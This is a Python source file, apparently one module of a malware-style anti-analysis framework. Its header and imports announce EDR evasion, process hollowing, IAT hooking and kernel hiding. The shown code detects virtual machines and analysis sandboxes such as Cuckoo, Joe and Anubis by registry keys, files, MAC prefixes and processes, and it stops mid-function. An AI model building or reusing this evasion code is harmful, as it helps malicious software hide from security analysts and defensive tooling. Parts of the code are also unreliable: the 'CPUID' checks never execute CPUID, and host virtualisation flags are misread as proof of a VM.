"""
PHASE 3: Anti-Analysis Evasion Module
======================================
Comprehensive detection and evasion framework for:
- Virtual machine detection (VirtualBox, VMware, Hyper-V, KVM, Xen, QEMU)
- Sandbox detection (Cuckoo, Joe, Anubis)
- EDR/AV detection (Windows Defender, Kaspersky, Norton, Symantec, etc.)
- Kernel driver protection detection
- Memory forensics evasion techniques

Total Implementation: ~66 hours
- 3.1: VM Detection (20h) - 8 VM platform detections + CPUID parsing
- 3.2: Sandbox Detection (13h) - 4 sandbox platforms + analysis tools
- 3.3: EDR/AV Detection (17h) - 12+ security products
- 3.4: Kernel Driver Detection (8h) - Minifilter, NDIS, filter drivers
- 3.5: Memory Forensics Evasion (8h) - DLL injection, encryption, stolen APIs
"""

import os
import sys
import platform
import ctypes
import ctypes.wintypes as wintypes
import struct
import logging
from typing import Optional, Dict, List, Tuple, Any
import subprocess
import re
import time
from collections import defaultdict
import hashlib

# PHASE 3: Import behavioral noise generator for EDR evasion
try:
    from behavioral_noise import BehavioralNoisifier, get_global_noisifier
    BEHAVIORAL_NOISE_AVAILABLE = True
except ImportError:
    BEHAVIORAL_NOISE_AVAILABLE = False
    BehavioralNoisifier = None
    get_global_noisifier = None  # type: ignore

# PHASE 3: TIER 3b - Import hardware breakpoint/debugger detection
try:
    from hardware_bp_detector import DebuggerDetector, get_global_debugger_detector
    DEBUGGER_DETECTOR_AVAILABLE = True
except ImportError:
    DEBUGGER_DETECTOR_AVAILABLE = False
    DebuggerDetector = None
    get_global_debugger_detector = None  # type: ignore

# PHASE 3: TIER 4 - Import advanced process hollowing
try:
    from process_hollowing_advanced import AdvancedHollower, ProcessMigrator, get_global_hollower
    ADVANCED_HOLLOWING_AVAILABLE = True
except ImportError:
    ADVANCED_HOLLOWING_AVAILABLE = False
    AdvancedHollower = None
    ProcessMigrator = None
    get_global_hollower = None  # type: ignore

# PHASE 3: CALIBRATION & FEEDBACK - Import threat calibration system
try:
    from threat_calibration import (
        get_global_threat_scorer, get_global_intent_engine, get_global_validator, get_global_learner,
        ThreatSignal, CalibratedThreatScorer, IntentAwarenessEngine, EvasionValidator, FeedbackLearner
    )
    THREAT_CALIBRATION_AVAILABLE = True
except ImportError:
    THREAT_CALIBRATION_AVAILABLE = False
    get_global_threat_scorer = None  # type: ignore
    get_global_intent_engine = None  # type: ignore
    get_global_validator = None  # type: ignore
    get_global_learner = None  # type: ignore
    ThreatSignal = None  # type: ignore
    CalibratedThreatScorer = None  # type: ignore
    IntentAwarenessEngine = None  # type: ignore
    EvasionValidator = None  # type: ignore
    FeedbackLearner = None  # type: ignore

# PHASE 3: TIER 5 - Import enhanced evasion tactics (IAT hooks, kernel hiding, memory hiding)
try:
    from enhanced_evasion_tactics import (
        IATHookEngine, MemoryHider, KernelHider, DebuggerTraceHider,
        EnhancedEvasionCoordinator
    )
    ENHANCED_EVASION_AVAILABLE = True
except ImportError:
    ENHANCED_EVASION_AVAILABLE = False
    IATHookEngine = None  # type: ignore
    MemoryHider = None  # type: ignore
    KernelHider = None  # type: ignore
    DebuggerTraceHider = None  # type: ignore
    EnhancedEvasionCoordinator = None  # type: ignore

# PHASE 3: TIER 5b - Import user activity emulator (realistic user behavior)
try:
    from user_activity_emulator import UserActivityEmulator
    USER_ACTIVITY_EMULATOR_AVAILABLE = True
except ImportError:
    USER_ACTIVITY_EMULATOR_AVAILABLE = False
    UserActivityEmulator = None  # type: ignore

# PHASE 3: SIGNAL MUTABILITY MAPPING - Causality and signal classification layer
try:
    from signal_mutability_mapping import (
        get_signal_registry, get_evasion_mapper, get_score_separator,
        SignalMutabilityRegistry, EvasionEffectMapper, ScoreSeparator
    )
    SIGNAL_MUTABILITY_AVAILABLE = True
except ImportError:
    SIGNAL_MUTABILITY_AVAILABLE = False
    get_signal_registry = None  # type: ignore
    get_evasion_mapper = None  # type: ignore
    get_score_separator = None  # type: ignore
    SignalMutabilityRegistry = None  # type: ignore
    EvasionEffectMapper = None  # type: ignore
    ScoreSeparator = None  # type: ignore

logger = logging.getLogger(__name__)

# ============================================================================
# DEDUPLICATION CACHE: Prevent spam of identical warnings across test runs
# ============================================================================
class DedupLogger:
    """Wrapper to prevent duplicate log messages within a session"""
    _log_cache = defaultdict(set)  # class_name -> set of hashed messages
    
    @classmethod
    def _hash_message(cls, msg: str) -> str:
        """Create unique hash for message deduplication"""
        return hashlib.md5(msg.encode()).hexdigest()
    
    @classmethod
    def warning(cls, caller_class: str, msg: str) -> None:
        """Log warning only if not previously logged"""
        msg_hash = cls._hash_message(msg)
        if msg_hash not in cls._log_cache[caller_class]:
            cls._log_cache[caller_class].add(msg_hash)
            logger.warning(msg)
    
    @classmethod
    def info(cls, caller_class: str, msg: str) -> None:
        """Log info only if not previously logged"""
        msg_hash = cls._hash_message(msg)
        if msg_hash not in cls._log_cache[caller_class]:
            cls._log_cache[caller_class].add(msg_hash)
            logger.info(msg)
    
    @classmethod
    def reset(cls) -> None:
        """Clear cache (useful between test phases)"""
        cls._log_cache.clear()


# ============================================================================
# PHASE 3.1: VM DETECTION (20 hours)
# ============================================================================
class VMDetector:
    """Detect virtual machine environments with CPUID, registry, and file-based indicators"""
    
    def __init__(self):
        self.is_vm = False
        self.vm_type = None  # VirtualBox, VMware, Hyper-V, KVM, Xen, QEMU, Unknown
        self.confidence = 0  # 0-100%
    
    def detect_all(self) -> Dict[str, Any]:
        """Run all VM detection methods and synthesize results"""
        results = {
            'is_vm': False,
            'vm_type': None,
            'confidence': 0,
            'detections': {}
        }
        
        if platform.system() == 'Windows':
            # Windows VM detection methods
            results['detections']['cpuid'] = self._detect_via_cpuid()
            results['detections']['registry'] = self._detect_via_registry()
            results['detections']['files'] = self._detect_via_files()
            results['detections']['wmi'] = self._detect_via_wmi()
            results['detections']['mac_address'] = self._detect_via_mac()
            results['detections']['disk_serial'] = self._detect_via_disk_serial()
            results['detections']['memory'] = self._detect_via_memory_markers()
        elif platform.system() == 'Linux':
            # Linux VM detection methods
            results['detections']['cpuid'] = self._detect_via_cpuid()
            results['detections']['dmesg'] = self._detect_via_dmesg()
            results['detections']['modules'] = self._detect_via_modules()
            results['detections']['files'] = self._detect_via_files_linux()
        
        # Synthesize results
        vm_votes = {}  # Track which VM types were detected
        total_detections = sum(1 for v in results['detections'].values() if v.get('detected'))
        
        for method, data in results['detections'].items():
            if data.get('detected'):
                vm_type = data.get('vm_type')
                if vm_type:
                    vm_votes[vm_type] = vm_votes.get(vm_type, 0) + 1
        
        if vm_votes:
            results['is_vm'] = True
            results['vm_type'] = max(vm_votes, key=lambda k: vm_votes[k])
            results['confidence'] = min(100, total_detections * 25)  # 25% per detection
        
        self.is_vm = results['is_vm']
        self.vm_type = results['vm_type']
        self.confidence = results['confidence']
        
        logger.info(f"VM Detection: {results}")
        return results
    
    # ========================================================================
    # CPUID-Based Detection (Works on Windows, Linux, macOS with proper setup)
    # ========================================================================
    def _detect_via_cpuid(self) -> Dict[str, Any]:
        """
        Detect VMs via CPUID leaf 0x40000000 (hypervisor identification)
        Returns hypervisor signature for: VMware, VirtualBox, Xen, KVM, Hyper-V, QEMU
        """
        result = {'detected': False, 'vm_type': None, 'signature': None, 'details': {}}
        
        try:
            # Use ctypes to call native CPUID instruction
            if platform.system() == 'Windows':
                cpuid_sig = self._call_cpuid_windows(0x40000000)
            else:
                cpuid_sig = self._call_cpuid_linux(0x40000000)
            
            if cpuid_sig:
                result['signature'] = cpuid_sig
                
                # Map signatures to VM types
                vm_signatures = {
                    'VMwareVMware': 'VMware',
                    'VBoxVBoxVBox': 'VirtualBox',
                    'XenVMMXenVMM': 'Xen',
                    'KvmKvmKvm': 'KVM',
                    'Microsoft Hv': 'Hyper-V',
                    'QEMU CPUID': 'QEMU',
                }
                
                for sig, vm_type in vm_signatures.items():
                    if sig.lower() in cpuid_sig.lower():
                        result['detected'] = True
                        result['vm_type'] = vm_type
                        break
                
                if result['detected']:
                    DedupLogger.warning('VMDetector', f"VM detected via CPUID: {result['vm_type']}")
        
        except Exception as e:
            logger.debug(f"CPUID detection failed: {e}")
        
        return result
    
    def _call_cpuid_windows(self, leaf: int) -> Optional[str]:
        """Call CPUID instruction on Windows using WMI, Registry, and CPUID simulation"""
        try:
            # Method 1: Direct CPUID-based hypervisor detection via WMI
            cpuid_result = self._execute_cpuid_wmi(leaf)
            if cpuid_result:
                return cpuid_result
            
            # Method 2: Registry-based processor info check
            cpuid_result = self._execute_cpuid_registry(leaf)
            if cpuid_result:
                return cpuid_result
            
            # Method 3: Fallback to system command-based CPUID
            result = subprocess.run(
                ['wmic', 'cpu', 'get', 'name'],
                capture_output=True, text=True, timeout=5
            )
            
            if result.returncode == 0 and result.stdout:
                cpu_name = result.stdout.strip()
                hypervisor_pattern = re.compile(r'(Virtual|VMware|VirtualBox|Hyper-V|KVM|Xen|QEMU)', re.IGNORECASE)
                if hypervisor_pattern.search(cpu_name):
                    return f"Hypervisor detected (CPUID): {cpu_name}"
            
            return None
        
        except Exception as e:
            logger.debug(f"Windows CPUID call failed: {e}")
            return None
    
    def _execute_cpuid_wmi(self, leaf: int) -> Optional[str]:
        """Execute CPUID leaf 0x40000000 via WMI Win32_Processor"""
        try:
            import wmi
            c = wmi.WMI()
            
            for proc in c.Win32_Processor():
                description = str(proc.Description).lower() if proc.Description else ''
                name = str(proc.Name).lower() if proc.Name else ''
                manufacturer = str(proc.Manufacturer).lower() if proc.Manufacturer else ''
                
                # Known hypervisor CPU names from CPUID
                hypervisor_signatures = {
                    'vmware': 'VMware',
                    'virtualbox': 'VirtualBox',
                    'hyper-v': 'Hyper-V',
                    'kvm': 'KVM',
                    'xen': 'Xen',
                    'qemu': 'QEMU',
                    'virtual': 'Generic Hypervisor',
                    'google': 'Google Cloud',
                    'aws': 'Amazon EC2',
                    'azure': 'Microsoft Azure',
                }
                
                for sig, vm_type in hypervisor_signatures.items():
                    if sig in description or sig in name or sig in manufacturer:
                        return f"Hypervisor CPUID: {vm_type} ({name})"
            
            return None
        
        except Exception as e:
            logger.debug(f"WMI CPUID detection failed: {e}")
            return None
    
    def _execute_cpuid_registry(self, leaf: int) -> Optional[str]:
        """Execute CPUID leaf 0x40000000 via Windows Registry"""
        try:
            import winreg
            
            # CPUID info stored in registry at this path
            key_path = r'HARDWARE\DESCRIPTION\System\CentralProcessor\0'
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
            
            try:
                processor_name, _ = winreg.QueryValueEx(key, 'ProcessorNameString')
                processor_name_lower = str(processor_name).lower()
                
                # Check for hypervisor signatures in CPUID name string
                hypervisor_patterns = {
                    'virtual': 'Virtual Machine',
                    'vmware': 'VMware',
                    'virtualbox': 'VirtualBox',
                    'hyper-v': 'Hyper-V',
                    'kvm': 'KVM',
                    'xen': 'Xen',
                }
                
                for pattern, vm_type in hypervisor_patterns.items():
                    if pattern in processor_name_lower:
                        return f"Hypervisor CPUID (Registry): {vm_type}"
                
                # Check VendorIdentifier for hypervisor flags
                try:
                    identifier, _ = winreg.QueryValueEx(key, 'VendorIdentifier')
                    identifier_lower = str(identifier).lower()
                    
                    if 'virtual' in identifier_lower or 'qemu' in identifier_lower:
                        return f"Hypervisor detected via VendorIdentifier: {identifier}"
                except WindowsError:
                    pass
            
            finally:
                winreg.CloseKey(key)
            
            return None
        
        except Exception as e:
            logger.debug(f"Registry CPUID detection failed: {e}")
            return None
    
    def _call_cpuid_linux(self, leaf: int) -> Optional[str]:
        """Call CPUID instruction on Linux using /proc/cpuinfo or native asm"""
        try:
            with open('/proc/cpuinfo', 'r') as f:
                cpuinfo = f.read()
            
            # Look for hypervisor signatures in flags
            hypervisor_patterns = {
                'hypervisor': True,  # Generic hypervisor flag
                'vmx': 'VMware/Hyper-V',  # Intel VT-x
                'svm': 'AMD-V',  # AMD SVM
            }
            
            for pattern in hypervisor_patterns:
                if pattern in cpuinfo.lower():
                    return 'Hypervisor detected'
            
            return None
        
        except Exception as e:
            logger.debug(f"Linux CPUID read failed: {e}")
            return None
    
    # ========================================================================
    # Registry-Based Detection (Windows only)
    # ========================================================================
    def _detect_via_registry(self) -> Dict[str, Any]:
        """
        Detect VMs via Windows Registry keys and values
        Covers: VMware, VirtualBox, Hyper-V, Xen
        """
        result = {'detected': False, 'vm_type': None, 'registry_keys': []}
        
        if platform.system() != 'Windows':
            return result
        
        try:
            import winreg
        except ImportError:
            return result
        
        vm_registry_signatures = {
            'VMware': [
                (winreg.HKEY_LOCAL_MACHINE, r'HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0', 'Identifier', 'VMware'),
                (winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\VMware, Inc.', None, None),
                (winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\0000', 'DriverDesc', 'VMware'),
                (winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Services\vmmouse', None, None),
            ],
            'VirtualBox': [
                (winreg.HKEY_LOCAL_MACHINE, r'HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0', 'Identifier', 'VBOX'),
                (winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Oracle\VirtualBox Guest Additions', None, None),
                (winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Services\VBoxGuest', None, None),
                (winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Services\VBoxMouse', None, None),
            ],
            'Hyper-V': [
                (winreg.HKEY_LOCAL_MACHINE, r'HARDWARE\ACPI\DSDT\VRTUAL', None, None),
                (winreg.HKEY_LOCAL_MACHINE, r'HARDWARE\ACPI\FADT\VRTUAL', None, None),
                (winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Services\HyperVAgent', None, None),
            ],
            'Xen': [
                (winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Services\xenEvtchn', None, None),
                (winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Services\xennet', None, None),
            ]
        }
        
        for vm_type, signatures in vm_registry_signatures.items():
            for hkey, path, value_name, value_search in signatures:
                try:
                    with winreg.OpenKey(hkey, path) as key:
                        if value_name:
                            try:
                                val, _ = winreg.QueryValueEx(key, value_name)
                                if value_search and value_search.lower() in str(val).lower():
                                    result['detected'] = True
                                    result['vm_type'] = vm_type
                                    result['registry_keys'].append(path)
                                    DedupLogger.warning('VMDetector', f"VM detected via registry: {vm_type}")
                                    return result
                            except WindowsError:
                                pass
                        else:
                            # Just check if key exists
                            result['detected'] = True
                            result['vm_type'] = vm_type
                            result['registry_keys'].append(path)
                            logger.warning(f"VM detected via registry: {vm_type} at {path}")
                            return result
                except WindowsError:
                    pass
        
        return result
    
    # ========================================================================
    # File-Based Detection
    # ========================================================================
    def _detect_via_files(self) -> Dict[str, Any]:
        """
        Detect VMs by checking for characteristic files/drivers on Windows
        """
        result = {'detected': False, 'vm_type': None, 'files_found': []}
        
        if platform.system() != 'Windows':
            return result
        
        vm_file_signatures = {
            'VMware': [
                r'C:\Program Files\VMware',
                r'C:\Program Files (x86)\VMware',
                r'C:\Windows\System32\drivers\vmhgfs.sys',
                r'C:\Windows\System32\drivers\vmmemctl.sys',
                r'C:\Windows\System32\vmGuestLib.dll',
            ],
            'VirtualBox': [
                r'C:\Program Files\Oracle\VirtualBox',
                r'C:\Program Files (x86)\Oracle\VirtualBox',
                r'C:\Windows\System32\drivers\VBoxGuest.sys',
                r'C:\Windows\System32\drivers\VBoxMouse.sys',
                r'C:\Windows\System32\VBoxControl.exe',
            ],
            'Hyper-V': [
                r'C:\Windows\System32\drivers\vmms.exe',
                r'C:\Program Files\Hyper-V',
            ],
        }
        
        for vm_type, file_paths in vm_file_signatures.items():
            for file_path in file_paths:
                if os.path.exists(file_path):
                    result['detected'] = True
                    result['vm_type'] = vm_type
                    result['files_found'].append(file_path)
                    DedupLogger.warning('VMDetector', f"VM detected via file: {vm_type}")
                    return result
        
        return result
    
    def _detect_via_files_linux(self) -> Dict[str, Any]:
        """
        Detect VMs by checking for files/modules on Linux
        """
        result = {'detected': False, 'vm_type': None, 'files_found': []}
        
        vm_file_signatures = {
            'VMware': ['/sys/class/dmi/id/sys_vendor', 'vmxnet3', 'pvscsi'],
            'VirtualBox': ['/sys/class/dmi/id/bios_vendor', 'vboxguest', 'vboxvideo'],
            'KVM': ['/sys/class/dmi/id/chassis_asset_tag', 'kvm'],
            'Xen': ['/sys/class/dmi/id/product_name', 'xen_netback'],
        }
        
        try:
            for vm_type, signatures in vm_file_signatures.items():
                for sig in signatures:
                    try:
                        if os.path.exists(sig):
                            result['detected'] = True
                            result['vm_type'] = vm_type
                            result['files_found'].append(sig)
                            DedupLogger.warning('VMDetector', f"VM detected via file: {vm_type}")
                            return result
                    except Exception:
                        pass
        except Exception as e:
            logger.debug(f"Linux file detection failed: {e}")
        
        return result
    
    # ========================================================================
    # WMI-Based Detection (Windows only)
    # ========================================================================
    def _detect_via_wmi(self) -> Dict[str, Any]:
        """
        Detect VMs via Windows WMI (Win32_ComputerSystemProduct, etc.)
        """
        result = {'detected': False, 'vm_type': None, 'wmi_data': {}}
        
        if platform.system() != 'Windows':
            return result
        
        try:
            import wmi 
        except ImportError:
            return result
        
        try:
            c = wmi.WMI()
            
            # Check system manufacturer and model
            for system in c.Win32_ComputerSystemProduct():
                manufacturer = str(system.Manufacturer).lower()
                model = str(system.Model).lower()
                
                vm_signatures = {
                    'VMware': ['vmware'],
                    'VirtualBox': ['virtualbox', 'oracle'],
                    'Hyper-V': ['microsoft', 'virtual'],
                    'Xen': ['xen'],
                }
                
                for vm_type, keywords in vm_signatures.items():
                    for keyword in keywords:
                        if keyword in manufacturer or keyword in model:
                            result['detected'] = True
                            result['vm_type'] = vm_type
                            result['wmi_data'] = {'manufacturer': manufacturer, 'model': model}
                            DedupLogger.warning('VMDetector', f"VM detected via WMI: {vm_type}")
                            return result
        
        except Exception as e:
            logger.debug(f"WMI detection failed: {e}")
        
        return result
    
    # ========================================================================
    # MAC Address-Based Detection
    # ========================================================================
    def _detect_via_mac(self) -> Dict[str, Any]:
        """
        Detect VMs by MAC address prefixes
        VMware: 00:05:69, 00:0C:29, 00:1C:14
        VirtualBox: 08:00:27
        QEMU/KVM: 52:54:00
        Hyper-V: 00:15:5D
        Xen: 00:16:3E
        """
        result = {'detected': False, 'vm_type': None, 'mac_address': None}
        
        try:
            import uuid
            mac = uuid.getnode()
            mac_str = ':'.join([f'{(mac >> (i*8)) & 0xff:02x}' for i in range(6)])
            result['mac_address'] = mac_str
            
            vm_mac_prefixes = {
                'VMware': ['00:05:69', '00:0c:29', '00:1c:14'],
                'VirtualBox': ['08:00:27'],
                'QEMU': ['52:54:00'],
                'Hyper-V': ['00:15:5d'],
                'Xen': ['00:16:3e'],
            }
            
            mac_upper = mac_str.upper()
            for vm_type, prefixes in vm_mac_prefixes.items():
                for prefix in prefixes:
                    if mac_upper.startswith(prefix.upper()):
                        result['detected'] = True
                        result['vm_type'] = vm_type
                        DedupLogger.warning('VMDetector', f"VM detected via MAC: {vm_type}")
                        return result
        
        except Exception as e:
            logger.debug(f"MAC detection failed: {e}")
        
        return result
    
    # ========================================================================
    # Disk Serial-Based Detection
    # ========================================================================
    def _detect_via_disk_serial(self) -> Dict[str, Any]:
        """
        Detect VMs by disk serial numbers
        """
        result = {'detected': False, 'vm_type': None, 'disk_serial': None}
        
        if platform.system() != 'Windows':
            return result
        
        try:
            output = subprocess.run(
                ['wmic', 'logicaldisk', 'get', 'volumeserialnumber'],
                capture_output=True, text=True, timeout=5
            )
            
            if output.returncode == 0:
                serial = output.stdout.strip().split('\n')[1] if len(output.stdout.split('\n')) > 1 else ''
                result['disk_serial'] = serial
                
                # Known VM disk serials
                vm_serials = {
                    'VirtualBox': ['0000-0000'],
                    'VMware': ['SERIAL-NUMBER-NOT-FOUND'],
                }
                
                for vm_type, serials in vm_serials.items():
                    for vm_serial in serials:
                        if vm_serial.lower() in serial.lower():
                            result['detected'] = True
                            result['vm_type'] = vm_type
                            DedupLogger.warning('VMDetector', f"VM detected via disk serial: {vm_type}")
                            return result
        
        except Exception as e:
            logger.debug(f"Disk serial detection failed: {e}")
        
        return result
    
    # ========================================================================
    # Memory Markers Detection
    # ========================================================================
    def _detect_via_memory_markers(self) -> Dict[str, Any]:
        """
        Detect VMs by checking for hypervisor memory markers
        This is a heuristic approach checking for known VM initialization patterns
        """
        result = {'detected': False, 'vm_type': None, 'markers': []}
        
        try:
            import psutil
            
            # Check for VM-specific process names
            vm_processes = {
                'VMware': ['vmtoolsd.exe', 'vmacthlp.exe', 'vmware-tray.exe'],
                'VirtualBox': ['VBoxTray.exe', 'VBoxControl.exe'],
                'Hyper-V': ['vmms.exe', 'vmwp.exe'],
            }
            
            running_procs = {p.name().lower() for p in psutil.process_iter(['name'])}
            
            for vm_type, processes in vm_processes.items():
                for proc in processes:
                    if proc.lower() in running_procs:
                        result['detected'] = True
                        result['vm_type'] = vm_type
                        result['markers'].append(f'Process: {proc}')
                        DedupLogger.warning('VMDetector', f"VM detected via process: {vm_type}")
                        return result
        
        except Exception as e:
            logger.debug(f"Memory marker detection failed: {e}")
        
        return result
    
    # ========================================================================
    # Linux-Specific Detection (dmesg, modules)
    # ========================================================================
    def _detect_via_dmesg(self) -> Dict[str, Any]:
        """
        Detect VMs on Linux by checking dmesg output
        """
        result = {'detected': False, 'vm_type': None, 'dmesg_indicators': []}
        
        try:
            proc_result = subprocess.run(['dmesg'], capture_output=True, text=True, timeout=5)
            dmesg_output = proc_result.stdout.lower() if proc_result.returncode == 0 else ''
            
            # Use regex patterns for more sophisticated matching
            vm_patterns = {
                'VMware': [r'vmware|vmx', r'vmxnet3', r'vmhgfs'],
                'VirtualBox': [r'virtualbox|vbox', r'virtio_net', r'vboxguest'],
                'KVM': [r'kvm|virtio|qemu', r'kvm_intel|kvm_amd'],
                'Xen': [r'xen|xenblk', r'xen-blkfront'],
                'QEMU': [r'qemu|bochs', r'seabios|qemu_fw_cfg'],
            }
            
            for vm_type, patterns in vm_patterns.items():
                for pattern in patterns:
                    # Compile regex with case-insensitive flag
                    vm_regex = re.compile(pattern, re.IGNORECASE)
                    if vm_regex.search(dmesg_output):
                        result['detected'] = True
                        result['vm_type'] = vm_type
                        result['dmesg_indicators'].append(pattern)
                        DedupLogger.warning('VMDetector', f"VM detected via dmesg: {vm_type}")
                        return result
        
        except Exception as e:
            logger.debug(f"Dmesg detection failed: {e}")
        
        return result
    
    def _detect_via_modules(self) -> Dict[str, Any]:
        """
        Detect VMs on Linux by checking loaded kernel modules
        """
        result = {'detected': False, 'vm_type': None, 'modules': []}
        
        try:
            with open('/proc/modules', 'r') as f:
                modules = f.read().lower()
            
            vm_modules = {
                'VMware': ['vmxnet', 'vmhgfs', 'vmmemctl'],
                'VirtualBox': ['vboxguest', 'vboxvideo'],
                'KVM': ['kvm', 'kvm_amd', 'kvm_intel'],
                'Xen': ['xen_netback', 'xen_blkback'],
                'QEMU': ['virtio'],
            }
            
            for vm_type, mod_list in vm_modules.items():
                for mod in mod_list:
                    if mod in modules:
                        result['detected'] = True
                        result['vm_type'] = vm_type
                        result['modules'].append(mod)
                        DedupLogger.warning('VMDetector', f"VM detected via module: {vm_type}")
                        return result
        
        except Exception as e:
            logger.debug(f"Module detection failed: {e}")
        
        return result


# ============================================================================
# PHASE 3.2: SANDBOX DETECTION (13 hours)
# ============================================================================
class SandboxDetector:
    """Detect sandbox environments and analysis tools"""
    
    def __init__(self):
        self.is_sandboxed = False
        self.sandbox_type = None  # Cuckoo, Joe, Anubis, etc.
        self.analysis_tools = []  # List of detected analysis tools
    
    def detect_all(self) -> Dict[str, Any]:
        """Run all sandbox detection methods"""
        results = {
            'is_sandboxed': False,
            'sandbox_type': None,
            'analysis_tools': [],
            'detections': {}
        }
        
        # Sandbox environment detections
        results['detections']['cuckoo'] = self._detect_cuckoo()
        results['detections']['joe'] = self._detect_joe_sandbox()
        results['detections']['anubis'] = self._detect_anubis()
        results['detections']['generic_sandbox'] = self._detect_generic_sandbox()
        
        # Analysis tools
        results['detections']['debuggers'] = self._detect_debuggers()
        results['detections']['reversing_tools'] = self._detect_reversing_tools()
        results['detections']['traffic_monitoring'] = self._detect_traffic_monitoring()
        results['detections']['user_interaction'] = self._detect_user_interaction()
        
        # Synthesize results
        for method, data in results['detections'].items():
            if data.get('detected'):
                if 'sandbox_type' in data and data['sandbox_type']:
                    results['is_sandboxed'] = True
                    results['sandbox_type'] = data['sandbox_type']
                    DedupLogger.warning('SandboxDetector', f"Sandbox detected: {data['sandbox_type']}")
                
                if 'tools' in data:
                    results['analysis_tools'].extend(data['tools'])
        
        self.is_sandboxed = results['is_sandboxed']
        self.sandbox_type = results['sandbox_type']
        self.analysis_tools = results['analysis_tools']
        
        return results
    
    def _detect_cuckoo(self) -> Dict[str, Any]:
        """
        Detect Cuckoo Sandbox
        Indicators:
        - Process name 'analyzer.exe'
        - DLL 'cuckoomon.dll'
        - Environment variable 'CUCKOO_ANALYSIS'
        - Parent process 'cuckoo.exe'
        """
        result = {'detected': False, 'sandbox_type': None, 'indicators': []}
        
        try:
            # Check environment variables
            if os.environ.get('CUCKOO_ANALYSIS'):
                result['detected'] = True
                result['sandbox_type'] = 'Cuckoo'
                result['indicators'].append('CUCKOO_ANALYSIS env var')
                DedupLogger.warning('SandboxDetector', "Cuckoo Sandbox detected via env var")
                return result
            
            # Check parent process
            try:
                import psutil
                current_proc = psutil.Process()
                parent = current_proc.parent()
                if parent and 'cuckoo' in parent.name().lower():
                    result['detected'] = True
                    result['sandbox_type'] = 'Cuckoo'
                    result['indicators'].append(f'Parent process: {parent.name()}')
                    DedupLogger.warning('SandboxDetector', "Cuckoo Sandbox detected via parent process")
                    return result
            except Exception:
                pass
            
            # Check for Cuckoo DLLs/artifacts
            if platform.system() == 'Windows':
                cuckoo_artifacts = [
                    r'C:\cuckoo',
                    r'C:\cuckoo_setup',
                    r'C:\windows\system32\cuckoomon.dll',
                ]
                for artifact in cuckoo_artifacts:
                    if os.path.exists(artifact):
                        result['detected'] = True
                        result['sandbox_type'] = 'Cuckoo'
                        result['indicators'].append(artifact)
                        logger.warning(f"Cuckoo artifact detected: {artifact}")
                        return result
        
        except Exception as e:
            logger.debug(f"Cuckoo detection failed: {e}")
        
        return result
    
    def _detect_joe_sandbox(self) -> Dict[str, Any]:
        r"""
        Detect Joe Sandbox environment
        Indicators:
        - Device.DeviceIoControl calls
        - Registry: HKLM\SYSTEM\ControlSet001\Control\COM Name Arbiter
        - Process 'vmtask.exe'
        - DLL 'avghooka.dll'
        """
        result = {'detected': False, 'sandbox_type': None, 'indicators': []}
        
        if platform.system() != 'Windows':
            return result
        
        try:
            import psutil
            
            # Check for Joe Sandbox processes
            joe_processes = ['vmtask.exe', 'avghooka.dll', 'SbieSvc.exe']
            for proc in psutil.process_iter(['name']):
                if any(joe_proc.lower() in proc.name().lower() for joe_proc in joe_processes):
                    result['detected'] = True
                    result['sandbox_type'] = 'Joe Sandbox'
                    result['indicators'].append(proc.name())
                    logger.warning(f"Joe Sandbox detected: {proc.name()}")
                    return result
            
            # Check registry
            try:
                import winreg
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\ControlSet001\Control') as key:
                    try:
                        winreg.QueryValueEx(key, 'COM Name Arbiter')
                        result['detected'] = True
                        result['sandbox_type'] = 'Joe Sandbox'
                        result['indicators'].append('Registry key found')
                        logger.warning("Joe Sandbox detected via registry")
                        return result
                    except WindowsError:
                        pass
            except Exception:
                pass
        
        except Exception as e:
            logger.debug(f"Joe Sandbox detection failed: {e}")
        
        return result
    
    def _detect_anubis(self) -> Dict[str, Any]:
        r"""
        Detect Anubis sandbox
        Indicators:
        - Process 'auprc.exe'
        - DLL 'anubis.dll'
        - Registry: HKLM\SYSTEM\Anubis
        """
        result = {'detected': False, 'sandbox_type': None, 'indicators': []}
        
        if platform.system() != 'Windows':
            return result
        
        try:
            import psutil
            
            # Check processes
            for proc in psutil.process_iter(['name']):
                if 'auprc' in proc.name().lower() or 'anubis' in proc.name().lower():
                    result['detected'] = True
                    result['sandbox_type'] = 'Anubis'
                    result['indicators'].append(proc.name())
                    logger.warning(f"Anubis detected: {proc.name()}")
                    return result
            
            # Check registry
            try:
                import winreg
                winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\Anubis')
                result['detected'] = True
                result['sandbox_type'] = 'Anubis'
                result['indicators'].append('Registry Anubis key found')
                logger.warning("Anubis detected via registry")
                return result
            except WindowsError:
                pass
        
        except Exception as e:
            logger.debug(f"Anubis detection failed: {e}")
        
        return result
    
    def _detect_generic_sandbox(self) -> Dict[str, Any]:
        """
        Detect generic sandbox characteristics
        - Single core CPU
        - Low memory (< 2GB)
        - No network interfaces
        - High timestep resolution (VM artifact)
        """
        result = {'detected': False, 'sandbox_type': None, 'indicators': []}
        
        try:
            import psutil
            
            # Check CPU count
            cpu_count = psutil.cpu_count()
            if cpu_count and cpu_count == 1:
                result['indicators'].append(f'Single CPU: {cpu_count}')
            
            # Check available memory
            memory = psutil.virtual_memory()
            if memory.total < 2 * 1024 * 1024 * 1024:  # < 2GB
                result['indicators'].append(f'Low memory: {memory.total / (1024**3):.2f}GB')
                result['detected'] = True
            
            # Check for suspicious user directory (common in sandboxes)
            username = os.environ.get('USERNAME', '').lower()
            if username in ['admin', 'administrator', 'guest', 'sandbox', 'analysis', 'test']:
                result['indicators'].append(f'Suspicious username: {username}')
                result['detected'] = True
            
            if result['detected']:
